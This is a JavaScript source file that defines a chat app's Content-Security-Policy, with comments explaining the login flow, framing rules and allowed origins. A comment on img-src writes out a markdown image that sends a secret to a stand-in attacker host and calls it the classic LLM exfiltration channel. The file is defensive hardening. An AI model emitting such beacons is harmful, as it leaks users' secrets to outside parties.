/**
 * The one Content-Security-Policy served with every response.
 *
 * `connect-src` must include the IAM origin (hanzo.id): login is browser PKCE,
 * so the SPA itself fetches `/.well-known/openid-configuration` and POSTs the
 * code to `/v1/iam/oauth/token`. Without it a visitor signs in at hanzo.id,
 * returns to `/auth/callback`, and the exchange dies on CSP ("IAM session bridge
 * failed: Failed to fetch") — login silently never completes. hanzo.id is NOT
 * covered by `*.hanzo.ai`.
 *
 * `frame-src` stays at `'self'`. It once also listed hanzo.id, for `signinSilent()`
 * — a `prompt=none` authorize in a HIDDEN IFRAME. That flow is gone: hanzo.id
 * answers `frame-ancestors 'none'` + `X-Frame-Options: DENY` on every route
 * including `/login/oauth/authorize`, so the IdP refuses to be framed by anyone
 * and no relying-party CSP can change that. Chat now signs in by interactive
 * redirect only, and renews the forwarded bearer server-side
 * (services/iamBearerRefresh.js `currentBearer`) — which is what actually keeps a
 * signed-in session answering. Do not re-add the origin without a flow that uses it.
 *
 * `frame-ancestors 'self'` (with `X-Frame-Options: SAMEORIGIN`) refuses framing by
 * any other origin; same-origin is needed for the silent.mp3 audio unlock iframe.
 * Nothing may embed US. We embed exactly one third party: the muted ambient
 * backdrop player (components/Chat/Backdrop.tsx), served from youtube-nocookie.
 */
const contentSecurityPolicy = [
  "default-src 'self'",
  // No analytics.hanzo.ai: the last page tag that loaded a script from it is gone.
  // Telemetry is the @hanzo/event client, which only ever POSTs (connect-src).
  "script-src 'self' 'unsafe-inline' 'unsafe-eval' https://hanzo.app https://static.cloudflareinsights.com",
  "style-src 'self' 'unsafe-inline'",
  // NOT `https:`. A bare-scheme image source is the classic LLM exfiltration
  // channel: model output `![](https://attacker/p?d=<secret>)` auto-fires a
  // GET the instant it renders. The app's own images are same-origin (served
  // from /v1/chat/images) or come from our file store; nothing legitimate
  // needs an arbitrary host. The markdown image RENDERER also refuses to
  // auto-load a third-party src (MarkdownComponents.tsx `autoLoadable`) — this
  // is the backstop under it, so a future renderer that forgets still cannot
  // beacon.
  "img-src 'self' data: blob: https://s3.hanzo.ai https://s3-api.hanzo.ai",
  "font-src 'self' data:",
  "media-src 'self' data: blob:",
  "connect-src 'self' https://hanzo.id https://hanzo.app https://*.hanzo.ai https://*.hanzo.chat wss://*.hanzo.chat https://static.cloudflareinsights.com https://cloudflareinsights.com",
  // 'self' keeps the same-origin silent.mp3 audio-unlock iframe; the YouTube
  // origin is the Backdrop player and nothing else (www.youtube.com, not
  // nocookie — that host answers embeds with a configuration error).
  //
  // world.hanzo.ai is the dock's widget card (components/Chat/Dock). Every
  // origin here is enumerated on purpose rather than widened to *.hanzo.ai:
  // frame-src decides what may be rendered INSIDE this page, so a wildcard
  // would let any future subdomain — including one nobody reviewed — frame
  // itself over the conversation. A card whose origin is missing renders an
  // EMPTY frame and logs nothing useful, so cards.spec.ts asserts every card's
  // origin appears here.
  "frame-src 'self' https://www.youtube.com https://world.hanzo.ai",
  "frame-ancestors 'self'",
].join('; ');

module.exports = { contentSecurityPolicy };
